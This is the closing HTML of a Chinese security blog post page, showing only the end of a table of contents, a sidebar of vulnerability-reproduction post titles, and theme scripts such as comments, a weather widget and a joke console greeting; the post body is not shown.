toc-level-4"><a class="toc-link" href="#5-1-4-POST-%E6%B3%A8%E5%85%A5"><span class="toc-number">1.5.1.4.</span> <span class="toc-text">5.1.4  POST 注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-1-5-GetShell"><span class="toc-number">1.5.1.5.</span> <span class="toc-text">5.1.5  GetShell</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/12/20/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/fastjson-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" title="fastjson-1.2.24-反序列化导致任意命令执行漏洞"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/image/6.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="fastjson-1.2.24-反序列化导致任意命令执行漏洞"/></a><div class="content"><a class="title" href="/2022/12/20/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/fastjson-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" title="fastjson-1.2.24-反序列化导致任意命令执行漏洞">fastjson-1.2.24-反序列化导致任意命令执行漏洞</a><time datetime="2022-12-20T12:12:56.000Z" title="发表于 2022-12-20 20:12:56">2022-12-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/12/16/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Drupal-XSS%E6%BC%8F%E6%B4%9E/" title="Drupal-XSS漏洞"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/image/3.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Drupal-XSS漏洞"/></a><div class="content"><a class="title" href="/2022/12/16/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Drupal-XSS%E6%BC%8F%E6%B4%9E/" title="Drupal-XSS漏洞">Drupal-XSS漏洞</a><time datetime="2022-12-16T12:09:49.000Z" title="发表于 2022-12-16 20:09:49">2022-12-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/12/12/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/joomlar370/" title="joomlar370"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/image/8.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="joomlar370"/></a><div class="content"><a class="title" href="/2022/12/12/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/joomlar370/" title="joomlar370">joomlar370</a><time datetime="2022-12-12T12:02:06.000Z" title="发表于 2022-12-12 20:02:06">2022-12-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/12/09/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="typecho反序列化"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/image/19.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="typecho反序列化"/></a><div class="content"><a class="title" href="/2022/12/09/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="typecho反序列化">typecho反序列化</a><time datetime="2022-12-09T11:09:40.000Z" title="发表于 2022-12-09 19:09:40">2022-12-09</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/12/06/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/metinfo-6-0-0-file-read/" title="metinfo_6.0.0_file-read"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/image/28.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="metinfo_6.0.0_file-read"/></a><div class="content"><a class="title" href="/2022/12/06/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/metinfo-6-0-0-file-read/" title="metinfo_6.0.0_file-read">metinfo_6.0.0_file-read</a><time datetime="2022-12-06T01:40:23.000Z" title="发表于 2022-12-06 09:40:23">2022-12-06</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">31</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">5</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://image.anheyu.com/" title="安知鱼图床"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://image.anheyu.com/favicon.ico" alt="安知鱼图床"/><span class="back-menu-item-text">安知鱼图床</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><i class="anzhiyufont anzhiyu-icon-music faa-tada" style="font-size: 0.9em;"></i><span> 音乐馆</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言板</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/Linux/" style="font-size: 0.88rem;">Linux<sup>3</sup></a><a href="/tags/Windows/" style="font-size: 0.88rem;">Windows<sup>4</sup></a><a href="/tags/vulhub/" style="font-size: 0.88rem;">vulhub<sup>2</sup></a><a href="/tags/%E8%84%9A%E6%9C%AC/" style="font-size: 0.88rem;">脚本<sup>1</sup></a><a href="/tags/%E8%AF%AD%E8%A8%80/" style="font-size: 0.88rem;">语言<sup>6</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="anzhiyufont anzhiyu-icon-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8152976493" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random"></meting-js></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="is-center" id="loading-database"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-pulse-icon"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div id="he-plugin-simple"></div><script>var WIDGET = {
  "CONFIG": {
    "modules": "0124",
    "background": "2",
    "tmpColor": "FFFFFF",
    "tmpSize": "16",
    "cityColor": "FFFFFF",
    "citySize": "16",
    "aqiColor": "E8D87B",
    "aqiSize": "16",
    "weatherIconSize": "24",
    "alertIconSize": "18",
    "padding": "10px 10px 10px 10px",
    "shadow": "0",
    "language": "auto",
    "borderRadius": "20",
    "fixed": "true",
    "vertical": "top",
    "horizontal": "left",
    "left": "20",
    "top": "7.1",
    "key": "df245676fb434a0691ead1c63341cd94"
  }
}
</script><link rel="stylesheet" href="https://widget.qweather.net/simple/static/css/he-simple.css?v=1.4.0"/><script src="https://widget.qweather.net/simple/static/js/he-simple.js?v=1.4.0"></script><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/@fancyapps/ui@5.0.20/dist/fancybox/fancybox.umd.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.4/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
var HoldLog = console.log;
console.log = function () {};
let now1 = new Date();
queueMicrotask(() => {
  const Log = function () {
    HoldLog.apply(console, arguments);
  }; //在恢复前输出日志
  const grt = new Date("04/01/2021 00:00:00"); //此处修改你的建站时间或者网站上线时间
  now1.setTime(now1.getTime() + 250);
  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
  const dnum = Math.floor(days);
  const ascll = [
    `欢迎使用安知鱼!`,
    `生活明朗, 万物可爱`,
    `
        
       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
        
        `,
    "已上线",
    dnum,
    "天",
    "©2020 By 安知鱼 V1.6.6",
  ];
  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];

  setTimeout(
    Log.bind(
      console,
      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
      "color:#425AEF",
      "",
      "color:#425AEF",
      "color:#425AEF",
      "",
      "color:#425AEF",
      ""
    )
  );
  setTimeout(
    Log.bind(
      console,
      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
      "color:white; background-color:#4fd953",
      "",
      "",
      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
    )
  );

  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(
      console,
      "%c ⚡ Powered by 安知鱼 %c 你正在访问 cgjil 的博客.",
      "color:white; background-color:#f0ad4e",
      ""
    )
  );

  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
  );
});</script><script async src="/anzhiyu/random.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>(() => {
  const initWaline = () => {
    const waline = Waline.init(Object.assign({
      el: '#waline-wrap',
      serverURL: 'https://pinglun-ixrqfq3ea-xingloveyues-projects.vercel.app/',
      pageview: true,
      dark: 'html[data-theme="dark"]',
      path: window.location.pathname,
      comment: true,
    }, null))
  }

  const loadWaline = async () => {
    if (typeof Waline === 'object') initWaline()
    else {
      await getCSS('https://cdn.cbd.int/@waline/client@2.15.5/dist/waline.css')
      await getScript('https://cdn.cbd.int/@waline/client@2.15.5/dist/waline.js')
      initWaline()
    }
  }

  if ('Waline' === 'Waline' || !false) {
    if (false) anzhiyu.loadComment(document.getElementById('waline-wrap'),loadWaline)
    else setTimeout(loadWaline, 0)
  } else {
    window.loadOtherComment = loadWaline
  }
})()</script><input type="hidden" name="page-type" id="page-type" value="post"></div><script>window.addEventListener('load', () => {
  const changeContent = content => {
    if (content === '') return content

    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
    content = content.replace(/<[^>]+>/g,"") // remove html tag

    if (content.length > 150) {
      content = content.substring(0,150) + '...'
    }
    return content
  }

  const generateHtml = array => {
    let result = ''

    if (array.length) {
      for (let i = 0; i < array.length; i++) {
        result += '<div class=\'aside-list-item\'>'

        if (true) {
          const name = 'data-lazy-src'
          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'></a>`
        }

        result += `<div class='content'>
        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
        <div class='name'><span>${array[i].nick} / </span><time datetime="${array[i].date}">${anzhiyu.diffDate(array[i].date, true)}</time></div>
        </div></div>`
      }
    } else {
      result += '没有评论'
    }

    let $dom = document.querySelector('#card-newest-comments .aside-list')
    $dom.innerHTML= result
    window.lazyLoadInstance && window.lazyLoadInstance.update()
    window.pjax && window.pjax.refresh($dom)
  }

  const getComment = async () => {
    try {
      const res = await fetch('https://pinglun-ixrqfq3ea-xingloveyues-projects.vercel.app/api/comment?type=recent&count=6', { method: 'GET' })
      const result = await res.json()
      const walineArray = result.data.map(e => {
        return {
          'content': changeContent(e.comment),
          'avatar': e.avatar,
          'nick': e.nick,
          'url': e.url + '#' + e.objectId,
          'date': e.time || e.insertedAt
        }
      })
      saveToLocal.set('waline-newest-comments', JSON.stringify(walineArray), 10/(60*24))
      generateHtml(walineArray)
    } catch (err) {
      console.error(err)
      const $dom = document.querySelector('#card-newest-comments .aside-list')
      $dom.textContent= "无法获取评论，请确认相关配置是否正确"
    }
  }

  const newestCommentInit = () => {
    if (document.querySelector('#card-newest-comments .aside-list')) {
      const data = saveToLocal.get('waline-newest-comments')
      if (data) {
        generateHtml(JSON.parse(data))
      } else {
        getComment()
      }
    }
  }

  newestCommentInit()
  document.addEventListener('pjax:complete', newestCommentInit)
})</script><script>var visitorMail = "visitor@anheyu.com";
</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><script src="/js/anzhiyu/right_click_menu.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><canvas class="fireworks" mobile="true"></canvas><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/dist/fireworks.min.js"></script><script defer="defer" id="ribbon" src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="true" data-click="true"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/dist/canvas-fluttering-ribbon.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="500" mobile="false" src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/dist/canvas-nest.min.js"></script><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = true;
document.body.addEventListener('input', POWERMODE);
</script><script id="click-heart" src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/dist/click-heart.min.js" async="async" mobile="true"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof chatBtnFn === 'function' && chatBtnFn()
  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>